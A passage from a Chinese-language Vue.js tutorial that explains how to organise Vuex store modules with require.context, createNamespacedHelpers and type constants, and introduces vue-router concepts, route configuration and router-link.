<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> homeState = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> homeState</span><br></pre></td></tr></table></figure>

<p>后面使用<code>.default</code>属性获取文件导出内容时时，并不会用到<code>homeState</code>这个名字，也可以这样写</p>
<p><code>home/state.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时只能根据文件名和路径名，才能判断这个文件是干嘛的了</p>
</li>
<li><p>在<code>modules</code>同级目录，定义<code>index.js</code>整合所有的模块</p>
<ul>
<li><p>利用<code>webpack</code>中<code>require.context()</code>方法获取文件路径、利用<code>default</code>属性获取模块导出内容</p>
<p><code>moudles/index.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// require.context()方法时webpack内置方法，直接用</span></span><br><span class="line"><span class="keyword">const</span> files = <span class="built_in">require</span>.<span class="title function_">context</span>(<span class="string">&#x27;.&#x27;</span>, <span class="literal">true</span>, <span class="regexp">/\.js$/</span>) <span class="comment">// 搜索当前文件夹，及子文件夹中，以.js结尾的文件</span></span><br><span class="line"><span class="keyword">const</span> modules = &#123;&#125;</span><br><span class="line"><span class="comment">// keys()方法返回匹配的每个文件的相对路径，是个数组</span></span><br><span class="line">files.<span class="title function_">keys</span>().<span class="title function_">forEach</span>(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> path = key.<span class="title function_">replace</span>(<span class="regexp">/\.\/|\.js/g</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment">// 使用正则，把每个相对路径的 ./ 和.js 都替换成空字符串</span></span><br><span class="line">    <span class="comment">// path只剩下 home/state 这种和自身 index 了</span></span><br><span class="line">    <span class="keyword">if</span> (path == <span class="string">&#x27;index&#x27;</span>) <span class="keyword">return</span> <span class="comment">// 路径是自己则不做任何处理</span></span><br><span class="line">    <span class="keyword">let</span> [moduleName, type] = path.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (!modules[moduleName]) &#123;</span><br><span class="line">        modules[moduleName] = &#123;<span class="comment">// 开始构造导出对象</span></span><br><span class="line">            <span class="attr">namespaced</span>: <span class="literal">true</span> <span class="comment">// 构建命名空间配置 &#123;namespaced: true&#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 构建state/getters/actions/mutations配置项</span></span><br><span class="line">    <span class="comment">// files()方法的返回值一个Module类型的对象，其default属性值，就是每个文件导出的结果值</span></span><br><span class="line">    modules[moduleName][type] = <span class="title function_">files</span>(key).<span class="property">default</span> <span class="comment">//最终的modules对象，就是包含了每个配置项的模块对象</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(modules)</span><br><span class="line">    <span class="comment">// moudles的打印结果 = &#123;</span></span><br><span class="line">    <span class="comment">//     home: &#123;</span></span><br><span class="line">    <span class="comment">//         namespaced: true,</span></span><br><span class="line">    <span class="comment">//         state:&#123;&#125;,</span></span><br><span class="line">    <span class="comment">//         getters:&#123;&#125;,</span></span><br><span class="line">    <span class="comment">//         actions:&#123;&#125;,</span></span><br><span class="line">    <span class="comment">//         mutations:&#123;&#125;</span></span><br><span class="line">    <span class="comment">//     &#125;,</span></span><br><span class="line">    <span class="comment">//     search: &#123;</span></span><br><span class="line">    <span class="comment">//         namespaced: true,</span></span><br><span class="line">    <span class="comment">//         state:&#123;&#125;,</span></span><br><span class="line">    <span class="comment">//         getters:&#123;&#125;,</span></span><br><span class="line">    <span class="comment">//         actions:&#123;&#125;,</span></span><br><span class="line">    <span class="comment">//         mutations:&#123;&#125;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 这个结果，和我们一开始学vuex模块化编码是一致的</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> modules;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>在公共的<code>index.js</code>中，解构赋值上面的<code>modules</code>对象，这样就不用一个一个导入一大堆模块了</p>
<ul>
<li>另外，<code>vue-router</code>中不建议使用使用批量导入的方式，因为没有一个明确的规范</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="keyword">import</span> modules <span class="keyword">from</span> <span class="string">&#x27;./modules/index.js&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">    <span class="attr">modules</span>: &#123;</span><br><span class="line">        ...modules</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>公共的状态在<code>store/index.js</code>中维护，如<code>websocket</code>等</p>
</li>
</ul>
<h4 id="5-1-11-2-使用createNamespacedHelpers简化map-写法"><a href="#5-1-11-2-使用createNamespacedHelpers简化map-写法" class="headerlink" title="5.1.11.2.使用createNamespacedHelpers简化map*写法"></a>5.1.11.2.使用<code>createNamespacedHelpers</code>简化<code>map*</code>写法</h4><p>取数的数量越多，这种写法越清爽，提交<code>actions</code>和<code>mutations</code>同理</p>
<p><code>test.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">import &#123;createNamespacedHelpers&#125; from &#x27;vuex&#x27;;</span><br><span class="line"></span><br><span class="line">let mapsObj = createNamespacedHelpers(&#x27;home&#x27;) // 返回值是home模块对应的，mapState/mapGetters/mapActions/mapMutaions的一个对象</span><br><span class="line">let &#123;mapState: mapHomeState, mapActions: mapHomeActions&#125; = createNamespacedHelpers(&#x27;home&#x27;) // 取mapState，并重命名避免多个模块命名冲突</span><br><span class="line">let &#123;mapState: mapSearchState&#125; = createNamespacedHelpers(&#x27;search&#x27;)</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;TypeNav&quot;,</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    // this.$store.dispatch(&#x27;home/categoryList&#x27;)</span><br><span class="line">    console.log(mapHomeState([&#x27;message&#x27;]))</span><br><span class="line">    this.categoryList()</span><br><span class="line">  &#125;,</span><br><span class="line">  computed: &#123;</span><br><span class="line">    ...mapHomeState([&#x27;message&#x27;]) // 此时取值不用再指定第一个参数home模块名了，模板中可以直接使用&#123;&#123;message&#125;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    ...mapHomeActions([&#x27;categoryList&#x27;])</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><code>store/modules/home/actions.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;reqCategoryList&#125; <span class="keyword">from</span> <span class="string">&#x27;@/api/home.js&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> homeActions = &#123;</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">categoryList</span>(<span class="params">&#123;commit&#125;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> res = <span class="keyword">await</span> <span class="title function_">reqCategoryList</span>()</span><br><span class="line">        <span class="keyword">if</span>(res.<span class="property">code</span> == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> homeActions</span><br></pre></td></tr></table></figure>

<h4 id="5-1-11-3-actions和mutaions的types的统一管理"><a href="#5-1-11-3-actions和mutaions的types的统一管理" class="headerlink" title="5.1.11.3.actions和mutaions的types的统一管理"></a>5.1.11.3.<code>actions</code>和<code>mutaion</code>s的<code>types</code>的统一管理</h4><p>上一小节我们是直接提交的<code>action</code>，如果数据太多的话，不太好管理命名</p>
<p>-根据需求创建<code>action-types.js</code>和<code>mutation-types.js</code></p>
<p>数据少的的话，都放在<code>mutation-types.js</code>里也不是不行</p>
<p><code>store/mutation-types.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 所有的名字都列在这里</span></span><br><span class="line"><span class="comment">// actions</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">ACTION_CATEGORYLIST</span> = <span class="string">&#x27;ACTION_CATEGORYLIST&#x27;</span> <span class="comment">// 常量都大写</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// mutations</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">MUTATION_CATEGORYLIST</span> = <span class="string">&#x27;MUTATION_CATEGORYLIST&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后在用到的子模块的<code>action.js</code>或<code>mutation.js</code>中导入</p>
<p><code>home/action.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;reqCategoryList&#125; <span class="keyword">from</span> <span class="string">&#x27;@/api/home.js&#x27;</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> <span class="title class_">Types</span> <span class="keyword">from</span> <span class="string">&#x27;@/store/action-types.js&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> homeActions = &#123;</span><br><span class="line">    <span class="keyword">async</span> [<span class="title class_">Types</span>.<span class="property">ACTION_CATEGORYLIST</span>](&#123;commit&#125;) &#123;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> <span class="title function_">reqCategoryList</span>()</span><br><span class="line">        <span class="keyword">if</span>(result.<span class="property">code</span> == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="title function_">commit</span>(<span class="title class_">Types</span>.<span class="property">MUTATION_CATEGORYLIST</span>, result.<span class="property">data</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(result)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> homeActions</span><br></pre></td></tr></table></figure>

<p><code>home/mutation.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> <span class="title class_">Types</span> <span class="keyword">from</span> <span class="string">&#x27;@/store/action-types&#x27;</span></span><br><span class="line"><span class="keyword">const</span> homeMutations = &#123;</span><br><span class="line">    [<span class="title class_">Types</span>.<span class="property">MUTATION_CATEGORYLIST</span>](state, categoryList) &#123;</span><br><span class="line">        state.<span class="property">categoryList</span> = categoryList</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> homeMutations</span><br></pre></td></tr></table></figure>

<p><code>home/state.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> homeState = &#123;</span><br><span class="line">    <span class="attr">categoryList</span>: [] <span class="comment">// 定义的数据类型，要和实际返回的数据类型保持一致</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> homeState</span><br></pre></td></tr></table></figure>



<p>在组件中使用</p>
<p><code>test.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">		&lt;h2&gt;</span><br><span class="line">            &#123;&#123;categoryList&#125;&#125;</span><br><span class="line">    	&lt;/h2&gt;        </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import &#123;createNamespacedHelpers, mapState&#125; from &#x27;vuex&#x27;;</span><br><span class="line">import * as Types from &#x27;@/store/action-types.js&#x27;</span><br><span class="line">let mapsObj = createNamespacedHelpers(&#x27;home&#x27;)</span><br><span class="line">let &#123;mapState: mapHomeState, mapActions: mapHomeActions&#125; = createNamespacedHelpers(&#x27;home&#x27;) </span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;TypeNav&quot;,</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    console.log(mapHomeState([&#x27;message&#x27;]))</span><br><span class="line">    this[Types.ACTION_CATEGORYLIST]() // 注意写法</span><br><span class="line">  &#125;,</span><br><span class="line">  computed: &#123;</span><br><span class="line">    ...mapHomeState([&#x27;categoryList&#x27;])</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    ...mapHomeActions([Types.ACTION_CATEGORYLIST])</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>看另外一个案例</p>
<p><code>index.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">        &lt;HomeHeader v-model=&quot;currentCategory&quot;&gt;&lt;/HomeHeader&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import HomeHeader from &#x27;./home-header.vue&#x27;</span><br><span class="line">    import &#123;createNamespacedHelpers&#125; from &#x27;vuex&#x27;</span><br><span class="line">    import * as Types from &#x27;@/store/action-tpes&#x27;</span><br><span class="line">    // 这里拿到的都是home模块下的</span><br><span class="line">    let &#123;mapState,mapMutations&#125; = createNamespacedHelpers(&#x27;home&#x27;)</span><br><span class="line">    export default &#123;</span><br><span class="line">        methods: &#123;</span><br><span class="line">            ...mapMutations([Type.SET_CATEGORY])</span><br><span class="line">        &#125;,</span><br><span class="line">        computed: &#123;</span><br><span class="line">            ...mapState([&#x27;category&#x27;]),</span><br><span class="line">            currentCategory: &#123;</span><br><span class="line">                get() &#123; // 取值</span><br><span class="line">                    return this.category</span><br><span class="line">                &#125;,</span><br><span class="line">                set(value) &#123; // 修改状态</span><br><span class="line">                    this[Types.SET_CATEGORY](value)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h1 id="6-vue-router"><a href="#6-vue-router" class="headerlink" title="6.vue-router"></a>6.<code>vue-router</code></h1><p>路由就是一组<code>key-value</code>的对应关系，对于前端来说，<code>key</code>就是路径，<code>value</code>就是组件</p>
<p>多个路由，需要经过路由器的管理</p>
<h2 id="6-1-相关理解"><a href="#6-1-相关理解" class="headerlink" title="6.1.相关理解"></a>6.1.相关理解</h2><h3 id="6-1-1-vue-router的理解"><a href="#6-1-1-vue-router的理解" class="headerlink" title="6.1.1.vue-router的理解"></a>6.1.1.<code>vue-router</code>的理解</h3><p><code>vue</code>的一个插件库，专门用来实现<code>SPA</code>应用</p>
<h3 id="6-1-2-对SPA应用的理解"><a href="#6-1-2-对SPA应用的理解" class="headerlink" title="6.1.2.对SPA应用的理解"></a>6.1.2.对<code>SPA</code>应用的理解</h3><ul>
<li>单页<code>web</code>应用（<code>singel page web application, SPA</code>）</li>
<li>整个页面只有<span style="color:red">一个完整的页面</span></li>
<li>点击页面中的导航链接<span style="color:red">不会刷新</span>页面，只会做页面的<span style="color:red">局部更新</span></li>
<li>数据需要通过<code>ajax</code>获取</li>
</ul>
<h3 id="6-1-3-路由的理解"><a href="#6-1-3-路由的理解" class="headerlink" title="6.1.3.路由的理解"></a>6.1.3.路由的理解</h3><ul>
<li><p>什么是路由？</p>
<ul>
<li>一个路由就是一个映射关系（<code>key-value</code>）</li>
<li><code>key</code>为路径，<code>value</code>可能是<code>function</code>或<code>component</code></li>
</ul>
</li>
<li><p>路由分类</p>
<ul>
<li>后端路由：<ul>
<li>理解：<code>value</code>是<code>function</code>，用于处理客户端提交的请求</li>
<li>工作过程：服务器接收到一个请求时，根据请求路径找到匹配的函数来处理请求，返回响应数据</li>
</ul>
</li>
<li>前端路由<ul>
<li>理解：<code>value</code>是<code>component</code>，用于展示页面内容</li>
<li>工作过程：当浏览器的路径发生改变时，对应的组件就会显示</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="6-2-基本路由"><a href="#6-2-基本路由" class="headerlink" title="6.2.基本路由"></a>6.2.基本路由</h2><ul>
<li><p>引入<code>vue-router</code>，并配置路径和组件的映射关系</p>
<p><code>router/index.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">HomeView</span> <span class="keyword">from</span> <span class="string">&#x27;../views/HomeView.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>) <span class="comment">// Vue实例对象上，会多出一个$store对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes = [ <span class="comment">// 配置路径和组件的对应关系</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;home&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">HomeView</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;about&#x27;</span>,</span><br><span class="line">    <span class="comment">// route level code-splitting</span></span><br><span class="line">    <span class="comment">// this generates a separate chunk (about.[hash].js) for this route</span></span><br><span class="line">    <span class="comment">// which is lazy-loaded when the route is visited.</span></span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &quot;about&quot; */</span> <span class="string">&#x27;../views/AboutView.vue&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>main.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  router,</span><br><span class="line">  store,</span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>store</code>对象：</p>
</li>
</ul>
<p>​		<img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220601214649940.png" alt="image-20220601214649940"></p>
<ul>
<li><p><code>router-link</code>：指定组件的跳转菜单</p>
<ul>
<li><p>原始<code>html</code>中，我们使用<code>a</code>标签进行页面的跳转，如果现在想要实现点击切换路径，需要使用<code>router-link</code>标签，并配置一个<code>to</code>属性，值为路径。并且有一个<code>active-class</code>属性，点击时会有该属性值。</p>
</li>
<li><p><code>router-link</code>最终被渲染成<code>a</code>标签，所以需要有编程式导航，可以指定其他标签实现路由跳转</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link active-class=&quot;active&quot; to=&quot;/home&quot;&gt;Home&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>值得注意的是，<code>router-link</code>是一个组件，当用来写导航栏时，并且导航栏还有个<code>hover</code>的背景色样式，导航栏之前快速切换的话，页面会卡顿，因为<code>router-link</code>是一个组件，要花时间来渲染</p>
<ul>
<li><p>当服务器数据返回后，要循环渲染很多<code>router-link</code>（1000+），会消耗很多内存，不卡才怪了</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;all-sort-list2&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 一级菜单--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">v-for</span>=<span class="string">&quot;(c1, index) in categoryList&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">:key</span>=<span class="string">&quot;c1.categoryId&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">:class</span>=<span class="string">&quot;&#123;&#x27;cur&#x27;: currentIndex == index&#125;&quot;</span></span></span><br><span class="line"><span class="tag">         @<span class="attr">mouseenter</span>=<span class="string">&quot;changeIndex(index)&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- v-for中不使用router-link声明式导航 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;goSearch&quot;</span>&gt;</span>&#123;&#123;c1.categoryName&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">      <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 二、三级菜单 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item-list clearfix&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;display: currentIndex==index ? &#x27;block&#x27;: &#x27;none&#x27;&#125;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span 